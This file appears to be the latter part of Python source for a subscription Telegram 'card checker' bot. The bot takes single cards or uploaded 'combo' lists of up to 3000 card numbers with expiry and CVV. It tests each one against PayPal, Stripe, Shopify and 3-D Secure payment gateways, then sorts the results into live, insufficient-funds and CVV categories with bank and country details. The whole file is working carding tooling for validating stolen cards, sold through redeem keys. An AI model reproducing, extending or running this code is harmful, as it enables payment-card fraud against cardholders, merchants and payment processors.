        bin_info, bank, country, country_code = get_bin_info(bin_num)
        
        start_time = time.time()
        result = stripe_auth_gate_tome(card)
        execution_time = time.time() - start_time
        
        if "✅" in result:
            status_emoji = "✅"
        else:
            status_emoji = "❌"
        
        minux_keyboard = types.InlineKeyboardMarkup()
        minux_button = types.InlineKeyboardButton(text="𝗺𝗶𝗻𝘂𝘅 - 🍀", url="https://t.me/minux_rida")
        minux_keyboard.add(minux_button)
        
        # معلومات BIN إضافية
        bin_details = dato(card[:6])
        
        formatted_message = f"""<b>#Stripe_TOME_Auth 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result} {status_emoji}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
{bin_details}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: 𝗺𝗶𝗻𝘂𝘅 - 🍀</b>"""
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=formatted_message,
            reply_markup=minux_keyboard
        )
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Shopify Command (/sf) ==================
@bot.message_handler(commands=["sf"])
def shopify_command(message):
    def my_function():
        id = message.from_user.id
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        
        if BL == '𝗙𝗥𝗘𝗘':
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        
        try:
            date_str = json_data[str(id)]['timer'].split('.')[0]
            provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
            current_time = datetime.now()
            required_duration = timedelta(hours=0)
            if current_time - provided_time > required_duration:
                keyboard = types.InlineKeyboardMarkup()
                contact_button = types.InlineKeyboardButton(text="𝗠𝗜𝗡𝗨𝗫", url="https://t.me/minux_rida")
                keyboard.add(contact_button)
                bot.send_message(chat_id=message.chat.id, text='''<b>𝗬𝗼𝘂 𝗖𝗮𝗻𝗻𝗼𝘁 𝗨𝘀𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁 𝗕𝗲𝗰𝗮𝘂𝘀𝗲 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>''', reply_markup=keyboard)
                json_data[str(id)]['timer'] = 'none'
                json_data[str(id)]['plan'] = '𝗙𝗥𝗘𝗘'
                with open('data.json', 'w') as file:
                    json.dump(json_data, file, indent=2)
                return
        except:
            pass
        
        try:
            card = message.text.split(' ', 1)[1]
        except IndexError:
            bot.reply_to(message, f"<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/sf 4111111111111111|12|25|123</b>")
            return
        
        msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱 𝘄𝗶𝘁𝗵 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗚𝗮𝘁𝗲𝘄𝗮𝘆... ⏳</b>")
        
        bin_num = card[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        
        start_time = time.time()
        result = run_async_shopify(card)
        execution_time = time.time() - start_time
        
        if "✅" in result:
            status_emoji = "✅"
        elif "⚠️" in result:
            status_emoji = "⚠️"
        else:
            status_emoji = "❌"
        
        minux_keyboard = types.InlineKeyboardMarkup()
        minux_button = types.InlineKeyboardButton(text="𝗺𝗶𝗻𝘂𝘅 - 🍀", url="https://t.me/minux_rida")
        minux_keyboard.add(minux_button)
        
        formatted_message = f"""<b>#Shopify_Gateway 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result} {status_emoji}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: 𝗺𝗶𝗻𝘂𝘅 - 🍀</b>"""
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=formatted_message,
            reply_markup=minux_keyboard
        )
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Passed Command (/vbv) ==================
@bot.message_handler(commands=["vbv"])
def passed_command(message):
    def my_function():
        id = message.from_user.id
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        
        if BL == '𝗙𝗥𝗘𝗘':
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        
        try:
            date_str = json_data[str(id)]['timer'].split('.')[0]
            provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
            current_time = datetime.now()
            required_duration = timedelta(hours=0)
            if current_time - provided_time > required_duration:
                keyboard = types.InlineKeyboardMarkup()
                contact_button = types.InlineKeyboardButton(text="𝗠𝗜𝗡𝗨𝗫", url="https://t.me/minux_rida")
                keyboard.add(contact_button)
                bot.send_message(chat_id=message.chat.id, text='''<b>𝗬𝗼𝘂 𝗖𝗮𝗻𝗻𝗼𝘁 𝗨𝘀𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁 𝗕𝗲𝗰𝗮𝘂𝘀𝗲 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>''', reply_markup=keyboard)
                json_data[str(id)]['timer'] = 'none'
                json_data[str(id)]['plan'] = '𝗙𝗥𝗘𝗘'
                with open('data.json', 'w') as file:
                    json.dump(json_data, file, indent=2)
                return
        except:
            pass
        
        try:
            card = message.text.split(' ', 1)[1]
        except IndexError:
            bot.reply_to(message, f"<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/vbv 4111111111111111|12|25|123</b>")
            return
        
        msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱 𝘄𝗶𝘁𝗵 𝗣𝗮𝘀𝘀𝗲𝗱 𝗚𝗮𝘁𝗲𝘄𝗮𝘆... ⏳\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: $2.99</b>")
        
        bin_num = card[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        
        start_time = time.time()
        result = passed_gate(card)
        execution_time = time.time() - start_time
        
        if "✅" in result:
            status_emoji = "✅"
        elif "⚠️" in result:
            status_emoji = "⚠️"
        else:
            status_emoji = "❌"
        
        minux_keyboard = types.InlineKeyboardMarkup()
        minux_button = types.InlineKeyboardButton(text="𝗺𝗶𝗻𝘂𝘅 - 🍀", url="https://t.me/minux_rida")
        minux_keyboard.add(minux_button)
        
        formatted_message = f"""<b>#passed_Gateway $2.99 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result} {status_emoji}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
[ϟ] 𝗔𝗺𝗼𝘂𝗻𝘁: $2.99
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: 𝗺𝗶𝗻𝘂𝘅 - 🍀</b>"""
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=formatted_message,
            reply_markup=minux_keyboard
        )
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(content_types=["document"])
def handle_document(message):
    name = message.from_user.first_name
    with open('data.json', 'r') as file:
        json_data = json.load(file)
    id = message.from_user.id
    
    try:
        BL = json_data[str(id)]['plan']
    except:
        BL = '𝗙𝗥𝗘𝗘'
    
    if BL == '𝗙𝗥𝗘𝗘':
        with open('data.json', 'r') as json_file:
            existing_data = json.load(json_file)
        new_data = {
            id: {
                "plan": "𝗙𝗥𝗘𝗘",
                "timer": "none",
            }
        }
        existing_data.update(new_data)
        with open('data.json', 'w') as json_file:
            json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
        
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="𝗠𝗜𝗡𝗨𝗫", url="https://t.me/minux_rida")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>🌸 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {name}! 🌸

𝗙𝗿𝗲𝗲 𝗯𝗼𝘁 𝗳𝗼𝗿 𝗮𝗹𝗹 𝗺𝘆 𝗳𝗿𝗶𝗲𝗻𝗱𝘀 𝗔𝗻𝗱 𝗮𝗻𝘆𝗼𝗻𝗲 𝗲𝗹𝘀𝗲 
━━━━━━━━━━━━━━━━━
🌟 𝗚𝗼𝗼𝗱 𝗹𝘂𝗰𝗸!  
『@minux_rida』</b>
''', reply_markup=keyboard)
        return
    
    with open('data.json', 'r') as file:
        json_data = json.load(file)
        date_str = json_data[str(id)]['timer'].split('.')[0]
    
    try:
        provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
    except Exception as e:
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="𝗠𝗜𝗡𝗨𝗫", url="https://t.me/minux_rida")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>🌸 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {name}! 🌸

𝗙𝗿𝗲𝗲 𝗯𝗼𝘁 𝗳𝗼𝗿 𝗮𝗹𝗹 𝗺𝘆 𝗳𝗿𝗶𝗲𝗻𝗱𝘀 𝗔𝗻𝗱 𝗮𝗻𝘆𝗼𝗻𝗲 𝗲𝗹𝘀𝗲 
━━━━━━━━━━━━━━━━━
🌟 𝗚𝗼𝗼𝗱 𝗹𝘂𝗰𝗸!  
『@minux_rida』</b>
''', reply_markup=keyboard)
        return
    
    current_time = datetime.now()
    required_duration = timedelta(hours=0)
    if current_time - provided_time > required_duration:
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="𝗠𝗜𝗡𝗨𝗫", url="https://t.me/minux_rida")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗼𝘂 𝗖𝗮𝗻𝗻𝗼𝘁 𝗨𝘀𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁 𝗕𝗲𝗰𝗮𝘂𝘀𝗲 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>''', reply_markup=keyboard)
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        json_data[str(id)]['timer'] = 'none'
        json_data[str(id)]['plan'] = '𝗙𝗥𝗘𝗘'
        with open('data.json', 'w') as file:
            json.dump(json_data, file, indent=2)
        return
    
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    paypal_button = types.InlineKeyboardButton(text="𝗣𝗮𝘆𝗣𝗮𝗹  ☑️", callback_data='pp_file')
    stripe_button = types.InlineKeyboardButton(text="𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 🔥", callback_data='stripe_file')
    shopify_button = types.InlineKeyboardButton(text="𝗦𝗵𝗼𝗽𝗶𝗳𝘆 🛒", callback_data='shopify_file')
    passed_button = types.InlineKeyboardButton(text="𝗣𝗮𝘀𝘀𝗲𝗱 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 🔥", callback_data='passed_file')
    keyboard.add(paypal_button, stripe_button, shopify_button, passed_button)
    
    bot.reply_to(message, text='𝗖𝗵𝗼𝗼𝘀𝗲 𝗧𝗵𝗲 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 𝗬𝗼𝘂 𝗪𝗮𝗻𝘁 𝗧𝗼 𝗨𝘀𝗲', reply_markup=keyboard)
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)

# ================== Callback Handlers with Card Limit ==================

def process_file_with_limit(call, gateway_name, process_func, amount=None):
    """دالة عامة لمعالجة الملفات مع حد 3000 بطاقة"""
    id = call.from_user.id
    dd = 0
    live = 0
    risk = 0
    ccnn = 0
    insufficient = 0
    challenge = 0
    
    stop_event.clear()
    
    # نص البداية حسب البوابة
    if amount:
        start_text = f"𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 𝘄𝗶𝘁𝗵 {gateway_name}...⌛\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: ${amount}"
    else:
        start_text = f"𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 𝘄𝗶𝘁𝗵 {gateway_name}...⌛"
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=start_text
    )
    
    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            
            # تحديد الحد الأقصى (3000 بطاقة)
            max_cards = 3000
            if total > max_cards:
                bot.send_message(call.from_user.id, f"<b>⚠️ الملف يحتوي على {total} بطاقة. سيتم فحص أول {max_cards} بطاقة فقط.</b>")
                total = max_cards
                lino = lino[:max_cards]
            
            try:
                stopuser[f'{id}']['status'] = 'start'
            except:
                stopuser[f'{id}'] = {'status': 'start'}
            
            for idx, cc in enumerate(lino):
                if stopuser.get(f'{id}', {}).get('status') == 'stop' or stop_event.is_set():
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text='🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅ 🤖 𝗕𝗢𝗧 𝗯𝘆 ➜ @minux_rida'
                    )
                    return
                
                cc = cc.strip()
                if not cc:
                    continue
                
                bin_num = cc[:6]
                bin_info, bank, country, country_code = get_bin_info(bin_num)
                
                start_time = time.time()
                
                if amount:
                    last = process_func(cc, amount)
                else:
                    last = process_func(cc)
                    
                execution_time = time.time() - start_time
                
                # معالجة النتائج حسب نوع البوابة
                if gateway_name == "𝗣𝗮𝘆𝗣𝗮𝗹 ":
                    if "✅" in last:
                        live += 1
                        send_result(call.from_user.id, cc, last, bin_info, bank, country, country_code, execution_time, amount, "pp_drgam")
                    elif "💰" in last or "Insufficient" in last:
                        insufficient += 1
                        send_result(call.from_user.id, cc, last, bin_info, bank, country, country_code, execution_time, amount, "pp_drgam")
                    elif 'risk' in last.lower():
                        risk += 1
                    elif '𝗖𝗩𝗩' in last or 'CVV' in last or "⚠️" in last:
                        ccnn += 1
                    else:
                        dd += 1
                
                elif gateway_name == "𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵":
                    if "✅" in last:
                        live += 1
                        bin_details = dato(cc[:6])
                        send_result(call.from_user.id, cc, last, bin_info, bank, country, country_code, execution_time, None, "stripe_tome", bin_details)
                    else:
                        dd += 1
                
                elif gateway_name == "𝗦𝗵𝗼𝗽𝗶𝗳𝘆":
                    if "✅" in last:
                        live += 1
                        send_result(call.from_user.id, cc, last, bin_info, bank, country, country_code, execution_time, None, "shopify")
                    elif "⚠️" in last:
                        ccnn += 1
                        send_result(call.from_user.id, cc, last, bin_info, bank, country, country_code, execution_time, None, "shopify")
                    else:
                        dd += 1
                
                elif gateway_name == "𝗣𝗮𝘀𝘀𝗲𝗱":
                    if "✅" in last and "Authenticate Attempt Successful" in last:
                        live += 1
                        send_result(call.from_user.id, cc, last, bin_info, bank, country, country_code, execution_time, "2.99", "passed")
                    elif "⚠️" in last or "Challenge Required" in last:
                        challenge += 1
                    elif 'risk' in last.lower():
                        risk += 1
                    elif 'CVV' in last:
                        ccnn += 1
                    else:
                        dd += 1
                
                # إنشاء لوحة التحكم
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {cc[:16]}... •", callback_data='u8')
                status = types.InlineKeyboardButton(f"• 𝗦𝗧𝗔𝗧𝗨𝗦 ➜ {last[:15]} •", callback_data='u8')
                cm3 = types.InlineKeyboardButton(f"• 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ ➜ [ {live} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ ➜ [ {dd} ] •", callback_data='x')
                
                buttons = [cm1, status, cm3, cm4]
                
                if gateway_name == "𝗣𝗮𝘆𝗣𝗮𝗹 ":
                    cm7 = types.InlineKeyboardButton(f"• 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 💰 ➜ [ {insufficient} ] •", callback_data='x')
                    buttons.append(cm7)
                elif gateway_name == "𝗣𝗮𝘀𝘀𝗲𝗱":
                    cm8 = types.InlineKeyboardButton(f"• 𝗖𝗛𝗔𝗟𝗟𝗘𝗡𝗚𝗘 ⚠️ ➜ [ {challenge} ] •", callback_data='x')
                    buttons.append(cm8)
                elif gateway_name == "𝗦𝗵𝗼𝗽𝗶𝗳𝘆":
                    cm9 = types.InlineKeyboardButton(f"• 𝟯𝗗𝗦 ⚠️ ➜ [ {ccnn} ] •", callback_data='x')
                    buttons.append(cm9)
                
                cm5 = types.InlineKeyboardButton(f"• 𝗧𝗢𝗧𝗔𝗟 👻 ➜ [ {total} ] •", callback_data='x')
                stop = types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣 ]", callback_data='stop')
                buttons.extend([cm5, stop])
                
                mes.add(*buttons)
                
                # تحديث الرسالة
                status_text = f'''𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝗪𝗵𝗶𝗹𝗲 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 𝗔𝗿𝗲 𝗕𝗲𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸 𝗔𝘁 𝗧𝗵𝗲 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 {gateway_name}
{ f'💰 𝗔𝗺𝗼𝘂𝗻𝘁: ${amount}' if amount else '' }
𝗕𝗼𝘁 𝗕𝘆 @minux_rida
[{idx+1}/{total}]'''
                
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=status_text,
                    reply_markup=mes
                )
                
                if stopuser.get(f'{id}', {}).get('status') == 'stop':
                    break
                
                time.sleep(10)
                
    except Exception as e:
        print(f"Error in file processing: {e}")
    
    stopuser[f'{id}']['status'] = 'start'
    stop_event.clear()
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text='✅ 𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 🤖 𝗕𝗢𝗧 𝗕𝗬 ➜ @minux_rida'
    )

def send_result(user_id, card, result, bin_info, bank, country, country_code, exec_time, amount=None, gateway="pp_drgam", extra_info=""):
    """إرسال نتيجة البطاقة"""
    minux_keyboard = types.InlineKeyboardMarkup()
    minux_button = types.InlineKeyboardButton(text="𝗺𝗶𝗻𝘂𝘅 - 🍀", url="https://t.me/minux_rida")
    minux_keyboard.add(minux_button)
    
    if gateway == "pp_drgam":
        amount_text = f"${amount}"
        gateway_name = "pp_Drgam_Gateway"
    elif gateway == "stripe_tome":
        amount_text = ""
        gateway_name = "Stripe_TOME_Auth"
    elif gateway == "shopify":
        amount_text = ""
        gateway_name = "Shopify_Gateway"
    elif gateway == "passed":
        amount_text = "$2.99"
        gateway_name = "passed_Gateway"
    
    info = f"""<b>#{gateway_name} {amount_text} 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
{ f'[ϟ] 𝗔𝗺𝗼𝘂𝗻𝘁: {amount_text}' if amount_text else '' }
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
{extra_info}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {exec_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: 𝗺𝗶𝗻𝘂𝘅 - 🍀</b>"""
    
    bot.send_message(user_id, info, reply_markup=minux_keyboard)

# PayPal Drgam File
@bot.callback_query_handler(func=lambda call: call.data == 'pp_file')
def menu_callback_pp(call):
    def my_function():
        user_amount = get_user_amount(call.from_user.id)
        process_file_with_limit(call, "𝗣𝗮𝘆𝗣𝗮𝗹 ", paypal_gate_drgam, user_amount)
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# Stripe TOME File
@bot.callback_query_handler(func=lambda call: call.data == 'stripe_file')
def menu_callback_stripe(call):
    def my_function():
        process_file_with_limit(call, "𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵", stripe_auth_gate_tome)
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# Shopify File
@bot.callback_query_handler(func=lambda call: call.data == 'shopify_file')
def menu_callback_shopify(call):
    def my_function():
        process_file_with_limit(call, "𝗦𝗵𝗼𝗽𝗶𝗳𝘆", run_async_shopify)
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# Passed File
@bot.callback_query_handler(func=lambda call: call.data == 'passed_file')
def menu_callback_passed(call):
    def my_function():
        process_file_with_limit(call, "𝗣𝗮𝘀𝘀𝗲𝗱", passed_gate)
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["redeem"])
def redeem_command(message):
    def my_function():
        try:
            code = message.text.split(' ')[1].strip().upper()
            
            if is_code_used(code):
                bot.reply_to(message, '<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗱𝗲 𝗵𝗮𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗯𝗲𝗲𝗻 𝘂𝘀𝗲𝗱</b>', parse_mode="HTML")
                return
            
            with open('data.json', 'r') as file:
                json_data = json.load(file)
            
            if code not in json_data:
                bot.reply_to(message, '<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗼𝗱𝗲</b>', parse_mode="HTML")
                return
            
            timer = json_data[code]['time']
            typ = json_data[code]['plan']
            
            json_data[str(message.from_user.id)] = {
                "plan": typ,
                "timer": timer
            }
            
            with open('data.json', 'w') as file:
                json.dump(json_data, file, indent=2)
            
            del json_data[code]
            with open('data.json', 'w') as file:
                json.dump(json_data, file, indent=2)
            
            mark_code_as_used(code)
            
            msg = f'''<b>𓆩 𝗞𝗲𝘆 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𓆪 ✅
💎 𝗗𝗲𝘃 : 『@minux_rida』
⏳ 𝗧𝗶𝗺𝗲 : {timer}  ✅
📝 𝗧𝘆𝗽𝗲 : {typ}</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")
            
        except IndexError:
            bot.reply_to(message, '<b>❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝗰𝗼𝗱𝗲\nمثال: /redeem MINUX-XXXX-XXXX-XXXX</b>', parse_mode="HTML")
        except Exception as e:
            print('ERROR : ', e)
            bot.reply_to(message, f'<b>❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)[:50]}</b>', parse_mode="HTML")
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["code"])
def code_command(message):
    def my_function():
        id = message.from_user.id
        if not id == admin:
            return
        try:
            h = float(message.text.split(' ')[1])
            with open('data.json', 'r') as json_file:
                existing_data = json.load(json_file)
            
            characters = string.ascii_uppercase + string.digits
            part1 = ''.join(random.choices(characters, k=4))
            part2 = ''.join(random.choices(characters, k=4))
            part3 = ''.join(random.choices(characters, k=4))
            pas = f"MINUX-{part1}-{part2}-{part3}"
            
            current_time = datetime.now()
            ig = current_time + timedelta(hours=h)
            plan = '𝗩𝗜𝗣'
            parts = str(ig).split(':')
            ig = ':'.join(parts[:2])
            
            new_data = {
                pas: {
                    "plan": plan,
                    "time": ig,
                }
            }
            existing_data.update(new_data)
            
            with open('data.json', 'w') as json_file:
                json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
            
            msg = f'''<b>╔═══════════════════╗
𓆩 𝗞𝗲𝘆 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𓆪 🌹💸
╚═══════════════════╝

📝 𝗣𝗟𝗔𝗡 ➜ {plan}
⏳ 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {ig}
🔑 𝗞𝗘𝗬 ➜ <code>/redeem {pas}</code>
</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")
        except Exception as e:
            print('ERROR : ', e)
            bot.reply_to(message, f"<b>Error: {e}</b>", parse_mode="HTML")
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    id = call.from_user.id
    if id in stopuser:
        stopuser[id]['status'] = 'stop'
    stop_event.set()
    bot.answer_callback_query(call.id, "🛑 𝗦𝘁𝗼𝗽𝗽𝗶𝗻𝗴...", show_alert=False)

print("Bot Start On ✅ - Multi Gateway Bot with Proxy Support")
print("💰 PayPal amount can be changed with /setamount (from $0.01 to $5.00)")
print("📋 Commands: /pp (PayPal Drgam), /chk (Stripe TOME), /sf (Shopify), /vbv (Passed)")
print("🔒 Proxy support enabled")
print("📊 Card limit: 3000 cards per file")

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)